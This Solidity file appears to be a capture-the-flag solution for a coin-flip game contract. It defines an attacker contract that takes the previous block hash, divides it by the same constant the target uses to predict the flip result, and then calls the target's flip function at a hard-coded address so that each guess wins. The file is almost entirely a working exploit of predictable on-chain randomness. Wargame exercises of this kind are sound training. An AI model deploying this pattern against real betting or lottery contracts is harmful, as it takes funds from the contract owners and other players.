// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IFlip} from "./interface/Iflip.sol";

contract FlipWinner {
    address public flip_contract;
    IFlip public FlipContract;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        flip_contract = 0x146Dad9efEdC1EF9f8D091650c2208857789e56F;
        FlipContract = IFlip(flip_contract);
    }

    function calculate_flip_side() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return side;
    }

    function make_a_flip() public {
        bool side = calculate_flip_side();
        FlipContract.flip(side);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlip {
    function flip(bool _guess) external returns (bool);
}